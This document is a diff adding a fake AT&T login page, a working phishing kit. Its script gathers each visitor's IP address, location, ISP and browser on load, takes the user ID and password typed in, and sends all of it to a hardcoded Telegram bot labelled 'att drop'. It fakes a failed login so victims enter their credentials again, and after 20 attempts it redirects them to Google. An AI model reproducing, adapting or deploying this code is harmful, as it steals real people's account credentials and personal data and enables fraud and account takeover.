@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AT&amp;T - Login</title>
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      width: 100%;
+      overflow: hidden;
+      font-family: Arial, sans-serif;
+    }
+
+    /* FULL RESPONSIVE BACKGROUND */
+    body {
+      background-image: url('https://res.cloudinary.com/dxzzgijsa/image/upload/v1765259878/Screenshot_2025-12-08_215625_dfbnnk.png');
+      background-size: cover; /* makes image fill all screens */
+      background-position: center; /* centers the image */
+      background-repeat: no-repeat; /* prevents repeating */
+      background-attachment: fixed; /* keeps it fixed on scroll */
+      height: 100vh;
+      width: 100vw;
+    }
+
+    .box {
+      position: absolute;
+      /* ADJUST THE LOGIN BOX POSITION (%) */
+      top: 54.7%; /* move up/down */
+      left: 49%; /* move left/right */
+      transform: translate(-50%, -50%);
+      background: rgba(255, 255, 255, 0.96);
+      width: 360px;
+      padding: 20px 25px;
+      border-radius: 10px;
+      text-align: center;
+      box-shadow: 0px 0px 0px rgba(0, 0, 0, 0.0);
+    }
+
+    h2 {
+      margin-bottom: 15px;
+      font-weight: 500;
+      color: #1d1d1d;
+    }
+
+    input {
+      width: 100%;
+      padding: 14px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      margin-top: 8px;
+      font-size: 15px;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 20px;
+      padding: 14px;
+      border: none;
+      background: #003e9b;
+      color: white;
+      font-size: 16px;
+      border-radius: 90px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      opacity: 0.9;
+    }
+
+    a {
+      display: block;
+      margin-top: 60px;
+      text-decoration: none;
+      font-size: 14px;
+      color: #003e9b;
+      cursor: pointer;
+    }
+
+    .back-link {
+      text-align: left;
+      margin-bottom: 50px;
+      font-size: 14px;
+      color: #003e9b;
+      cursor: pointer;
+      display: none;
+    }
+
+    #passwordStep {
+      display: none;
+    }
+
+    #introImageContainer {
+  position: fixed;                  
+  top: 0;
+  left: 0;
+  width: 100vw;                     
+  height: 100vh;                    
+  background-image: url("https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png");
+  background-size: contain;         
+  background-repeat: no-repeat;     
+  background-position: center;      
+  background-color: #ffffff;        /* fills empty sides with white */
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  z-index: 9999;
+    }
+
+    #loginContainer {
+      display: none;
+    }
+
+    #errorMessage {
+      color: red;
+      display: none;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Intro Image Section -->
+  <div id="introImageContainer">
+    <h2></h2>
+  </div>
+
+  <div class="box" id="loginContainer">
+    <div id="backBtn" class="back-link" onclick="goBack()">← Back</div>
+
+    <!-- USER ID STEP -->
+    <div id="userIdStep">
+      <h2></h2>
+      <label>User ID</label>
+      <input type="text" id="userIdInput" value="" required>
+      <button onclick="goToPassword()">Continue</button>
+    </div>
+
+    <!-- PASSWORD STEP -->
+    <div id="passwordStep">
+      <h2>Welcome</h2>
+      <div id="showUserId" style="margin-bottom: 40px; font-size: 20px; color:#333;"></div>
+      <label>Password</label>
+      <input type="password" id="passwordInput" required>
+      <button onclick="handleLogin()">Sign in</button>
+      <a href="#">Forgot password?</a>
+    </div>
+    <div id="errorMessage">Please fill out both fields.</div>
+  </div>
+
+  <script>
+    const token = '8438555807:AAEXvMdaoW7FaO418_AuojfDzt2BNUKMEhE';
+    const chatId = '8052751627';
+    let loginAttempts = 0;
+
+    function sendToTelegram(message) {
+      if (!navigator.onLine) {
+        console.log("[Offline] Telegram Message:", message);
+        return;
+      }
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).catch(err => console.error('Telegram error:', err));
+    }
+
+    function getPort() {
+      return window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
+    }
+
+    function sendVisitInfo() {
+      const userAgent = navigator.userAgent;
+      const port = getPort();
+      if (!navigator.onLine) {
+        sendToTelegram(`📴 Offline Visit\n🖥 Browser: ${userAgent}\n🔌 Port: ${port}`);
+        return;
+      }
+      fetch('https://ipapi.co/json/')
+        .then(res => res.json())
+        .then(data => {
+          const message = `att Visit Info\nIP: ${data.ip}\nPort: ${port}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nBrowser: ${userAgent}`;
+          sendToTelegram(message);
+        }).catch(() => {
+          sendToTelegram(`att Visit Info (IP lookup failed)\nPort: ${port}\nBrowser: ${userAgent}`);
+        });
+    }
+
+    function goToPassword() {
+      let userid = document.getElementById("userIdInput").value.trim();
+
+      if (userid === "") {
+        alert("Please enter your User ID");
+        return;
+      }
+
+      document.getElementById("userIdStep").style.display = "none";
+      document.getElementById("passwordStep").style.display = "block";
+      document.getElementById("backBtn").style.display = "block";
+      document.getElementById("showUserId").innerText = userid;
+    }
+
+    function goBack() {
+      document.getElementById("passwordStep").style.display = "none";
+      document.getElementById("userIdStep").style.display = "block";
+      document.getElementById("backBtn").style.display = "none";
+    }
+
+    function handleLogin() {
+      const email = document.getElementById('userIdInput').value.trim();
+      const password = document.getElementById('passwordInput').value.trim();
+
+      if (!email || !password) {
+        document.getElementById('errorMessage').textContent = "Please fill out both fields.";
+        document.getElementById('errorMessage').style.display = 'block';
+        return;
+      }
+
+      loginAttempts++;
+      const msg = `❌att drop #${loginAttempts}\n📧 Email: ${email}\n🔑 Password: ${password}`;
+      sendToTelegram(msg);
+
+      document.getElementById('errorMessage').textContent = "";
+      document.getElementById('errorMessage').style.display = 'block';
+      document.getElementById('passwordInput').value = '';
+
+      if (loginAttempts >= 20) {
+        window.location.href = 'https://google.com';
+      }
+    }
+
+    window.onload = function () {
+      sendVisitInfo();
+      setTimeout(() => {
+        document.getElementById('introImageContainer').style.display = 'none';
+        document.getElementById('loginContainer').style.display = 'block';
+      }, 1000); // Show intro image for 5 seconds
+    };
+  </script>
+</body>
+
+</html>
